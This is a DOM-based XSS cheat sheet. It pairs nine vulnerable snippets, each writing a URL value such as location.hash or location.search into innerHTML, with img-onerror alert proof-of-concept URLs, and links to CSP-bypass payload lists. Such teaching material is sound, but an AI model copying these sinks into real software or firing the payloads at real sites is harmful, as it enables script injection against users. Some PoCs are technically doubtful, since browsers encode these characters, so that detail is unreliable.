### 1. **`window.location.href`**

#### **JavaScript Code Example:**
```javascript
document.body.innerHTML = "You are on: " + window.location.href;
```

#### **Explanation:**
Here, the `window.location.href` value, which is the full URL of the page, is directly inserted into the DOM using `innerHTML`. This is dangerous because an attacker can manipulate the URL and inject malicious code that gets executed when the page is rendered.

#### **PoC:**
```html
http://example.com/#"><img src="x" onerror="alert('XSS')">
```

This payload inserts a `<img>` element that triggers an `onerror` event when the image fails to load, which then executes the `alert('XSS')` code.

---

### 2. **`window.location.search`**

#### **JavaScript Code Example:**
```javascript
let params = window.location.search;
document.body.innerHTML = "Search query: " + params;
```

#### **Explanation:**
The `window.location.search` retrieves the query string from the URL (the part after `?`). By directly inserting this value into the DOM using `innerHTML`, attackers can manipulate the query string to execute malicious JavaScript.

#### **PoC:**
```html
http://example.com/?q="><img src="x" onerror="alert('XSS')">
```

This payload manipulates the query parameter `?q=`, injecting an `<img>` tag with an `onerror` handler that executes JavaScript when the image fails to load.

---

### 3. **`URLSearchParams`**

#### **JavaScript Code Example:**
```javascript
let params = new URLSearchParams(window.location.search);
let paramValue = params.get('input');
document.body.innerHTML = "Input: " + paramValue;
```

#### **Explanation:**
`URLSearchParams` is used to retrieve query parameters from the URL. In this case, `paramValue` is obtained from the query string and inserted into the DOM using `innerHTML`. If not sanitized, attackers can inject malicious code through the `input` parameter.

#### **PoC:**
```html
http://example.com/?input="><img src="x" onerror="alert('XSS')">
```

By injecting an image with an `onerror` event, attackers can execute JavaScript when the image fails to load.

---

### 4. **`window.location.hash`**

#### **JavaScript Code Example:**
```javascript
document.body.innerHTML = "Hash value: " + window.location.hash;
```

#### **Explanation:**
The `window.location.hash` returns the part of the URL after the `#`. In this example, the value of the hash is inserted directly into the DOM using `innerHTML`. An attacker can manipulate the hash to include malicious code.

#### **PoC:**
```html
http://example.com/#"><img src="x" onerror="alert('XSS')">
```

The payload manipulates the URL hash to inject an image with an `onerror` event, which triggers JavaScript execution when the image cannot load.

---

### 5. **`document.URL`**

#### **JavaScript Code Example:**
```javascript
document.body.innerHTML = "Current URL: " + document.URL;
```

#### **Explanation:**
`document.URL` returns the full URL of the current page. In this case, the URL is injected into the DOM using `innerHTML`, making it vulnerable to XSS if an attacker manipulates the URL.

#### **PoC:**
```html
http://example.com/#"><img src="x" onerror="alert('XSS')">
```

By injecting an image element in the URL hash, attackers can trigger JavaScript execution through the `onerror` event.

---

### 6. **`location.href.indexOf()`**

#### **JavaScript Code Example:**
```javascript
if (location.href.indexOf("#prettyPhoto") !== -1) {
    document.body.innerHTML = "PrettyPhoto activated: " + location.hash;
}
```

#### **Explanation:**
This code checks if the URL contains the string `#prettyPhoto`. If true, the value of `location.hash` is injected into the DOM using `innerHTML`. An attacker can manipulate the URL hash to inject a malicious script.

#### **PoC:**
```html
http://example.com/#prettyPhoto="><img src="x" onerror="alert('XSS')">
```

This payload uses the URL hash to inject an image with an `onerror` event that triggers JavaScript execution.

---

### 7. **`location.hash`**

#### **JavaScript Code Example:**
```javascript
document.body.innerHTML = "Hash: " + location.hash;
```

#### **Explanation:**
The `location.hash` is the part of the URL after the `#`. This value is injected into the DOM directly using `innerHTML`. Without sanitization, an attacker can manipulate the hash to include a malicious script.

#### **PoC:**
```html
http://example.com/#"><img src="x" onerror="alert('XSS')">
```

By injecting an image with an `onerror` event in the hash, the payload triggers JavaScript execution when the image fails to load.

---

### 8. **`location.pathname`**

#### **JavaScript Code Example:**
```javascript
document.body.innerHTML = "Current path: " + location.pathname;
```

#### **Explanation:**
`location.pathname` returns the path portion of the URL. This value is injected into the DOM using `innerHTML`. If not sanitized, it allows attackers to inject malicious scripts through the URL path.

#### **PoC:**
```html
http://example.com/"><img src="x" onerror="alert('XSS')">
```

This payload manipulates the URL path to inject an image with an `onerror` event that triggers JavaScript execution.

---

### 9. **`location.search`**

#### **JavaScript Code Example:**
```javascript
document.body.innerHTML = "Search: " + location.search;
```

#### **Explanation:**
`location.search` returns the query string part of the URL, including the `?`. By directly inserting the query string into the DOM using `innerHTML`, attackers can manipulate the query string to include malicious scripts.

#### **PoC:**
```html
http://example.com/?search="><img src="x" onerror="alert('XSS')">
```

This payload manipulates the query string to inject an image with an `onerror` event that triggers JavaScript execution.


**blocked by csp?**
- [https://raw.githubusercontent.com/RHYru9/rhyru9.github.io/refs/heads/main/bug/xss-cheatsheet/csp.txt](https://raw.githubusercontent.com/RHYru9/rhyru9.github.io/refs/heads/main/bug/xss-cheatsheet/csp.txt)

**xss without Prentheses**
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
---
